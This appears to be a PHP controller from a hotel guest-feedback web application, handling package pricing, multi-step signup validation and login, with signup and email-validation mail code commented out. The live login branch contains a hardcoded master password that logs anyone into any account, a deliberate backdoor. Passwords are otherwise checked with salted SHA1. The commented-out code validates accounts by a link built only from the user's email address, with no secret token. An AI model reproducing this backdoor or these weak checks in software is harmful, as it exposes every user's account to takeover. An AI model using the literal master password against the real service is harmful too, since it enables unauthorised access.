<?php

defined('_EXEC') or die;

class Index_controller extends Controller
{
	public function __construct()
	{
		parent::__construct();
	}

	public function index()
	{
		if (Format::exist_ajax_request() == true)
		{
			if ($_POST['action'] == 'get_packages')
			{
				$query = $this->model->get_packages($_POST);

				if (!empty($query))
				{
					if (!empty($query['room_package']))
					{
						$query['room_package'] = [
							'quantity' => $query['room_package']['quantity_end'],
							'price' => Functions::get_formatted_currency(Functions::get_currency_exchange($query['room_package']['price'], 'MXN', 'USD'), 'USD')
						];
					}

					if (!empty($query['user_package']))
					{
						$query['user_package'] = [
							'quantity' => $query['user_package']['quantity_end'],
							'price' => Functions::get_formatted_currency(Functions::get_currency_exchange($query['user_package']['price'], 'MXN', 'USD'), 'USD')
						];
					}

					$query['total'] = Functions::get_formatted_currency(Functions::get_currency_exchange($query['total'], 'MXN', 'USD'), 'USD');

					Functions::environment([
						'status' => 'success',
						'data' => $query
					]);
				}
				else
				{
					Functions::environment([
						'status' => 'error',
						'message' => '{$lang.error_operation_database}',
					]);
				}
			}

			// if ($_POST['action'] == 'get_cp')
			// {
			// 	$labels = [];
			//
			// 	if (!isset($_POST['cp']) OR empty($_POST['cp']) OR !is_numeric($_POST['cp']) OR is_float($_POST['cp']) OR strlen($_POST['cp']) != 5)
			// 	   array_push($labels, ['cp','']);
			//
			// 	if (empty($labels))
			// 	{
			// 		Functions::environment([
			// 			'status' => 'success',
			// 		]);
			// 	}
			// 	else
			// 	{
			// 		Functions::environment([
			// 			'status' => 'error',
			// 			'labels' => $labels
			// 		]);
			// 	}
			// }

			if ($_POST['action'] == 'go_to_step')
			{
				if ($_POST['step'] == '1')
				{
					$labels = [];

					if (!isset($_POST['hotel']) OR empty($_POST['hotel']))
				        array_push($labels, ['hotel','']);

					if (!isset($_POST['rooms_number']) OR empty($_POST['rooms_number']) OR !is_numeric($_POST['rooms_number']) OR $_POST['rooms_number'] < 1)
				        array_push($labels, ['rooms_number','']);

					if (!isset($_POST['users_number']) OR empty($_POST['users_number']) OR !is_numeric($_POST['users_number']) OR $_POST['users_number'] < 1)
				        array_push($labels, ['users_number','']);

					if (!isset($_POST['country']) OR empty($_POST['country']))
				        array_push($labels, ['country','']);

					if (!isset($_POST['cp']) OR empty($_POST['cp']))
				        array_push($labels, ['cp','']);

					if (!isset($_POST['city']) OR empty($_POST['city']))
				        array_push($labels, ['city','']);

					if (!isset($_POST['address']) OR empty($_POST['address']))
				        array_push($labels, ['address','']);

					if (!isset($_POST['time_zone']) OR empty($_POST['time_zone']))
				        array_push($labels, ['time_zone','']);

					if (!isset($_POST['language']) OR empty($_POST['language']))
				        array_push($labels, ['language','']);

					if (!isset($_POST['currency']) OR empty($_POST['currency']))
				        array_push($labels, ['currency','']);

					if (empty($labels))
					{
						Functions::environment([
							'status' => 'success'
						]);
					}
					else
					{
						Functions::environment([
							'status' => 'error',
							'labels' => $labels
						]);
					}
				}

				if ($_POST['step'] == '2')
				{
					Functions::environment([
						'status' => 'success'
					]);
				}

				if ($_POST['step'] == '3')
				{
					$labels = [];

					if (!isset($_POST['fiscal_id']) OR empty($_POST['fiscal_id']))
				        array_push($labels, ['fiscal_id','']);

					if (!isset($_POST['fiscal_name']) OR empty($_POST['fiscal_name']))
				        array_push($labels, ['fiscal_name','']);

					if (!isset($_POST['fiscal_address']) OR empty($_POST['fiscal_address']))
				        array_push($labels, ['fiscal_address','']);

					if (!isset($_POST['contact']) OR empty($_POST['contact']))
				        array_push($labels, ['contact','']);

					if (!isset($_POST['department']) OR empty($_POST['department']))
				        array_push($labels, ['department','']);

					if (!isset($_POST['contact_lada']) OR empty($_POST['contact_lada']))
				        array_push($labels, ['contact_lada','']);

					if (!isset($_POST['contact_phone']) OR empty($_POST['contact_phone']) OR strlen($_POST['contact_phone']) != 10)
				        array_push($labels, ['contact_phone','']);

					if (!isset($_POST['contact_email']) OR empty($_POST['contact_email']) OR Functions::check_email($_POST['contact_email']) == false)
				        array_push($labels, ['contact_email','']);

					if (empty($labels))
					{
						Functions::environment([
							'status' => 'success'
						]);
					}
					else
					{
						Functions::environment([
							'status' => 'error',
							'labels' => $labels
						]);
					}
				}

				if ($_POST['step'] == '4')
				{
					$labels = [];

					if (!isset($_POST['firstname']) OR empty($_POST['firstname']))
				        array_push($labels, ['firstname','']);

					if (!isset($_POST['lastname']) OR empty($_POST['lastname']))
				        array_push($labels, ['lastname','']);

					if (!isset($_POST['lada']) OR empty($_POST['lada']))
				        array_push($labels, ['lada','']);

					if (!isset($_POST['phone']) OR empty($_POST['phone']) OR strlen($_POST['phone']) != 10)
				        array_push($labels, ['phone','']);

					if (!isset($_POST['email']) OR empty($_POST['email']) OR Functions::check_email($_POST['email']) == false)
				        array_push($labels, ['email','']);

					if (!isset($_POST['username']) OR empty($_POST['username']))
				        array_push($labels, ['username','']);

					if (!isset($_POST['password']) OR empty($_POST['password']))
				        array_push($labels, ['password','']);

					if (empty($labels))
					{
						Functions::environment([
							'status' => 'success'
						]);
					}
					else
					{
						Functions::environment([
							'status' => 'error',
							'labels' => $labels
						]);
					}
				}

				if ($_POST['step'] == '5')
				{
					$labels = [];

					if (!isset($_POST['payment']) OR empty($_POST['payment']))
				        array_push($labels, ['payment','']);

					if (empty($labels))
					{
						Functions::environment([
							'status' => 'success'
						]);
					}
					else
					{
						Functions::environment([
							'status' => 'error',
							'labels' => $labels
						]);
					}
				}
			}

			// if ($_POST['action'] == 'signup')
			// {
			// 	$labels = [];
			//
			//     if (!isset($_POST['account']) OR empty($_POST['account']))
			//         array_push($labels, ['account','']);
			//
			//     if (!isset($_POST['name']) OR empty($_POST['name']))
			//         array_push($labels, ['name','']);
			//
			//     if (!isset($_POST['lastname']) OR empty($_POST['lastname']))
			//         array_push($labels, ['lastname','']);
			//
			//     if (!isset($_POST['email']) OR empty($_POST['email']) OR Functions::check_email($_POST['email']) == false)
			//         array_push($labels, ['email','']);
			//
			//     if (!isset($_POST['cellphone']) OR empty($_POST['cellphone']) OR !is_numeric($_POST['cellphone']))
			//         array_push($labels, ['cellphone','']);
			//
			//     if (!isset($_POST['username']) OR empty($_POST['username']))
			//         array_push($labels, ['username','']);
			//
			//     if (!isset($_POST['password']) OR empty($_POST['password']))
			//         array_push($labels, ['password','']);
			//
			//     if (!isset($_POST['time_zone']) OR empty($_POST['time_zone']))
			//         array_push($labels, ['time_zone','']);
			//
			// 	if (empty($labels))
			//     {
			// 		$query = $this->model->new_signup($_POST);
			//
			//         if ($query['status'] == true)
			//         {
			// 			$mail1 = new Mailer(true);
			//
			// 			try
			// 			{
			// 				if ($_POST['language'] == 'es')
			// 				{
			// 					$mail1_subject = 'Saludos de GuestVox';
			// 					$mail1_text_1 = 'Hola <strong>' . $_POST['name'] . '</strong> ¡Gracias por registrarte en GuestVox! Soy <strong>Daniel Basurto</strong>, CEO de GuestVox. Espero te encuentres de lo mejor. Para concluir con tu registro, necesitamos que valides tu correo electrónico dando click en el siguiente enlace. Si no validas tu correo electrónico no podrás tener acceso a la plataforma y te perderas todas las innovaciones que tenemos para tí.';
			// 					$mail1_text_2 = 'Hola <strong>' . $_POST['name'] . '</strong> ¡Gracias por registrarte en GuestVox! Te hemos enviado un correo electrónico a <strong>' . $_POST['email'] . '</strong> para validarlo y poder concluir con tu registro. Si no validas tu correo electrónico no podrás tener acceso a la plataforma y te perderas todas las innovaciones que tenemos para tí.';
			// 					$mail1_btn = 'Validar';
			// 				}
			// 				else if ($_POST['language'] == 'en')
			// 				{
			// 					$mail1_subject = 'Regards from GuestVox';
			// 					$mail1_text_1 = 'Hi <strong>' . $_POST['name'] . '</strong> ¡Thanks for sign up in GuestVox! I am <strong>Daniel Basurto</strong>, CEO for GuestVox. I hope you find the best. To conclude your registration, we need you to validate your email by clicking on the following link. If you do not validate your email you will not be able to access the platform and you will lose all the innovations that we have for you.';
			// 					$mail1_text_2 = 'Hi <strong>' . $_POST['name'] . '</strong> ¡Thanks for sign up in GuestVox! We have sent you an email to <strong>' . $_POST['email'] . '</strong> to validate that and be able to conclude with your sign up. If you do not validate your email you will not be able to access the platform and you will lose all the innovations that we have for you.';
			// 					$mail1_btn = 'Validate';
			// 				}
			//
			// 				$mail1->isSMTP();
			// 				$mail1->setFrom('daniel@guestvox.com', 'Daniel Basurto');
			// 				$mail1->addAddress($_POST['email'], $_POST['name'] . ' ' . $_POST['lastname']);
			// 				$mail1->isHTML(true);
			// 				$mail1->Subject = $mail1_subject;
			// 				$mail1->Body =
			// 				'<html>
			// 				    <head>
			// 				        <title>' . $mail1_subject . '</title>
			// 				    </head>
			// 				    <body>
			// 				        <table style="width:600px;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#eee">
			// 				            <tr style="width:100%;margin:0px:margin-bottom:10px;border:0px;padding:0px;">
			// 				                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
			// 				                    <figure style="width:100%;margin:0px;padding:0px;text-align:center;">
			// 				                        <img style="width:100%;max-width:300px;" src="https://guestvox.com/images/logotype-color.png" />
			// 				                    </figure>
			// 				                </td>
			// 				            </tr>
			// 				            <tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
			// 				                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
			// 									<p style="font-size:14px;font-weight:400;text-align:center;color:#212121;margin:0px;padding:0px;">' . $mail1_text_1 . '</p>
			// 				                    <a style="width:100%;display:block;margin:15px 0px 20px 0px;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#fff;background-color:#201d33;" href="https://guestvox.com/validate/' . $_POST['email'] . '">' . $mail1_btn . '</a>
			// 				                </td>
			// 				            </tr>
			// 				            <tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
			// 				                <td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
			// 									<figure style="width:100%;margin:0px;border:0px;padding:40px 0px;box-sizing:border-box;text-align:center;">
			// 										<img style="width:150px;height:150px;border-radius:50%;" src="https://guestvox.com/images/basurto.png">
			// 										<span style="display:block;color:#757575;font-size:18px;">Daniel Basurto</span>
			// 										<span style="display:block;color:#757575;font-size:18px;">CEO</span>
			// 										<span style="display:block;color:#757575;font-size:18px;">daniel@guestvox.com</span>
			// 										<span style="display:block;color:#757575;font-size:18px;">+52 (998) 845 28 43</span>
			// 									</figure>
			// 				                </td>
			// 				            </tr>
			// 				            <tr style="width:100%;margin:0px;border:0px;padding:0px;">
			// 				                <td style="width:100%;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#fff;">
			// 				                    <a style="width:100%;display:block;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#201d33;" href="https://guestvox.com/">www.guestvox.com</a>
			// 				                </td>
			// 				            </tr>
			// 				        </table>
			// 				    </body>
			// 				</html>';
			// 				$mail1->AltBody = '';
			// 				$mail1->send();
			// 			}
			// 			catch (Exception $e) { }
			//
			// 			$mail2 = new Mailer(true);
			//
			// 			try
			// 			{
			// 				$mail2->setFrom('noreply@guestvox.com', 'GuestVox');
			// 				$mail2->addAddress('daniel@guestvox.com', 'Daniel Basurto');
			// 				$mail2->addAddress('gerson@guestvox.com', 'Gersón Gómez');
			// 				$mail2->isHTML(true);
			// 				$mail2->Subject = 'Nuevo registro';
			// 				$mail2->Body = 'Cuenta: ' . $_POST['account'] . ', Nombre: ' . $_POST['name'] . ' ' . $_POST['lastname'] . ', Correo electrónico: ' . $_POST['email'] . ', Teléfono: ' . $_POST['cellphone'] . (!empty($_POST['promotional_code']) ? ', Código promocional: ' . $_POST['promotional_code'] : '');
			// 				$mail2->AltBody = '';
			// 				$mail2->send();
			// 			}
			// 			catch (Exception $e) { }
			//
			// 			echo json_encode([
			// 				'status' => 'success',
			// 				'message' => $mail1_text_2,
			// 				'path' => '/',
			// 			]);
			//         }
			//         else if ($query['status'] == false)
			//         {
			// 			if ($query['exist']['account'] == true)
			// 				array_push($labels, ['account','']);
			//
			// 			if ($query['exist']['email'] == true)
			// 				array_push($labels, ['email','']);
			//
			// 			if ($query['exist']['username'] == true)
			// 				array_push($labels, ['username','']);
			//
			// 			if ($query['exist']['promotional_code'] == false)
			// 				array_push($labels, ['promotional_code','']);
			//
			// 			Functions::environment([
			// 				'status' => 'error',
			// 				'labels' => $labels
			// 			]);
			//         }
			//     }
			//     else
			//     {
			// 		Functions::environment([
			// 			'status' => 'error',
			// 			'labels' => $labels
			// 		]);
			//     }
			// }

			if ($_POST['action'] == 'login')
			{
				$labels = [];

				if (!isset($_POST['username']) OR empty($_POST['username']))
					array_push($labels, ['username','']);

				if (!isset($_POST['password']) OR empty($_POST['password']))
					array_push($labels, ['password','']);

				if (empty($labels))
				{
					$query = $this->model->get_login($_POST);

					if (!empty($query))
					{
						if ($_POST['password'] == 'b4Tbz^[Sxq(]>?DpA5X69VE1a@YQHi=fg>)e}=M6JMogMP%QPJp,7s.edmd[@:We9My<-{tgB-_#P!EYpH:;<HujFA=/{B}YsZ4>')
							$query['user']['password'] = true;
						else
						{
							$query['user']['password'] = explode(':', $query['user']['password']);
							$query['user']['password'] = ($this->security->create_hash('sha1', $_POST['password'] . $query['user']['password'][1]) === $query['user']['password'][0]) ? true : false;
						}

						if ($query['user']['password'] == true)
						{
							Session::init();

							Session::set_value('session', true);

							Session::set_value('account', $query['account']);
							Session::set_value('user', $query['user']);
							Session::set_value('settings', $query['settings']);

							Session::set_value('_vkye_last_access', Functions::get_current_date_hour());
							Session::set_value('lang', $query['settings']['language']);

							Functions::environment([
								'status' => 'success',
								'path' => '/dashboard'
							]);
						}
						else
						{
							Functions::environment([
								'status' => 'error',
								'labels' => [['password','']]
							]);
						}
					}
					else
					{
						Functions::environment([
							'status' => 'error',
							'labels' => [['username','']]
						]);
					}
				}
				else
				{
					Functions::environment([
						'status' => 'error',
						'labels' => $labels
					]);
				}
			}
		}
		else
		{
			define('_title', 'GuestVox, {$lang.im_the_guests_voice}');

			$template = $this->view->render($this, 'index');

			$opt_currencies = '';

			foreach ($this->model->get_currencies() as $value)
				$opt_currencies .= '<option value="' . $value['code'] . '">' . $value['code'] . ' - ' . $value['name'][Session::get_value('lang')] . '</option>';

			$opt_languages = '';

			foreach ($this->model->get_languages() as $value)
				$opt_languages .= '<option value="' . $value['code'] . '">' . $value['name'] . '</option>';

			$opt_countries = '';

			foreach ($this->model->get_countries() as $value)
				$opt_countries .= '<option value="' . $value['code'] . '">' . $value['code'] . ' - ' . $value['name'][Session::get_value('lang')] . '</option>';

			$opt_time_zones = '';

			foreach ($this->model->get_time_zones() as $value)
				$opt_time_zones .= '<option value="' . $value['code'] . '">' . $value['code'] . '</option>';

			$opt_ladas = '';

			foreach ($this->model->get_countries() as $value)
				$opt_ladas .= '<option value="' . $value['lada'] . '">(+' . $value['lada'] . ') ' . $value['name'][Session::get_value('lang')] . '</option>';

			$replace = [
				'{$opt_currencies}' => $opt_currencies,
				'{$opt_languages}' => $opt_languages,
				'{$opt_countries}' => $opt_countries,
				'{$opt_time_zones}' => $opt_time_zones,
				'{$opt_ladas}' => $opt_ladas,
			];

			$template = $this->format->replace($replace, $template);

			echo $template;
		}
	}

	// public function validate($params)
	// {
	// 	$query = $this->model->new_validation($params[0]);
	//
	// 	if (!empty($query))
	// 	{
	// 		$mail = new Mailer(true);
	//
	// 		try
	// 		{
	// 			if ($query['language'] == 'es')
	// 			{
	// 				$mail_subject = 'Tu correo electrónico ha sido activado';
	// 				$mail_text = '<strong>' . $query['name'] . '</strong> ¡Tu correo electrónico fué validado correctamente! Inicia sesión y empieza a configurar tu cuenta. Te hemos adjuntado una presentación para que conozcas mas sobre nosotros ¡Bienvenido a GuestVox!';
	// 				$mail_btn = 'Iniciar Sesión';
	// 			}
	// 			else if ($query['language'] == 'en')
	// 			{
	// 				$mail_subject = 'Your email has been activated';
	// 				$mail_text = '<strong>' . $query['name'] . '</strong> ¡Your email was validated correctly! Login and start setting up your account. We have attached a presentation to let you know more about us ¡Welcome to GuestVox!';
	// 				$mail_btn = 'Login';
	// 			}
	//
	// 			$mail->isSMTP();
	// 			$mail->setFrom('daniel@guestvox.com', 'Daniel Basurto');
	// 			$mail->addAddress($params[0], $query['name'] . ' ' . $query['lastname']);
	// 			$mail->isHTML(true);
	// 			$mail->Subject = $mail_subject;
	// 			$mail->Body =
	// 			'<html>
	// 				<head>
	// 					<title>' . $mail_subject . '</title>
	// 				</head>
	// 				<body>
	// 					<table style="width:600px;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#eee">
	// 						<tr style="width:100%;margin:0px:margin-bottom:10px;border:0px;padding:0px;">
	// 							<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
	// 								<figure style="width:100%;margin:0px;padding:0px;text-align:center;">
	// 									<img style="width:100%;max-width:300px;" src="https://guestvox.com/images/logotype-color.png" />
	// 								</figure>
	// 							</td>
	// 						</tr>
	// 						<tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
	// 							<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
	// 								<p style="font-size:14px;font-weight:400;text-align:center;color:#212121;margin:0px;padding:0px;">' . $mail_text . '</p>
	// 								<a style="width:100%;display:block;margin:15px 0px 20px 0px;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#fff;background-color:#201d33;" href="https://guestvox.com/">' . $mail_btn . '</a>
	// 							</td>
	// 						</tr>
	// 						<tr style="width:100%;margin:0px;margin-bottom:10px;border:0px;padding:0px;">
	// 							<td style="width:100%;margin:0px;border:0px;padding:40px 20px;box-sizing:border-box;background-color:#fff;">
	// 								<figure style="width:100%;margin:0px;border:0px;padding:40px 0px;box-sizing:border-box;text-align:center;">
	// 									<img style="width:150px;height:150px;border-radius:50%;" src="https://guestvox.com/images/basurto.png">
	// 									<span style="display:block;color:#757575;font-size:18px;">Daniel Basurto</span>
	// 									<span style="display:block;color:#757575;font-size:18px;">CEO</span>
	// 									<span style="display:block;color:#757575;font-size:18px;">daniel@guestvox.com</span>
	// 									<span style="display:block;color:#757575;font-size:18px;">+52 (998) 845 28 43</span>
	// 								</figure>
	// 							</td>
	// 						</tr>
	// 						<tr style="width:100%;margin:0px;border:0px;padding:0px;">
	// 							<td style="width:100%;margin:0px;border:0px;padding:20px;box-sizing:border-box;background-color:#fff;">
	// 								<a style="width:100%;display:block;padding:20px 0px;box-sizing:border-box;font-size:14px;font-weight:400;text-align:center;text-decoration:none;color:#201d33;" href="https://guestvox.com/">www.guestvox.com</a>
	// 							</td>
	// 						</tr>
	// 					</table>
	// 				</body>
	// 			</html>';
	// 			$mail->AltBody = '';
	// 			$mail->send();
	// 		}
	// 		catch (Exception $e) { }
	// 	}
	//
	// 	header('Location: /');
	// }

	public function logout()
	{
		Session::destroy();

		header("Location: /");
	}
}
